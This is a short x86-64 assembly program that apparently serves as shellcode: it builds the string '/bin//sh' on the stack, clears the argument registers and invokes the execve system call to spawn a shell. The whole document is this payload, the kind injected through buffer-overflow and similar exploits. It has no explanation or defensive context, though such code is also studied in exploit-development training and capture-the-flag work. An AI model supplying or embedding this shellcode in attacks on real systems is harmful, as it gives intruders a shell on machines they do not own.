section .text
 global _start
 _start:
 push rax 
 mov rbx,'/bin//sh'
 xor rsi, rsi 
 xor rdx, rdx 
 push rbx  
 push rsp 
 pop rdi 
 mov al, 0x3b 
 syscall
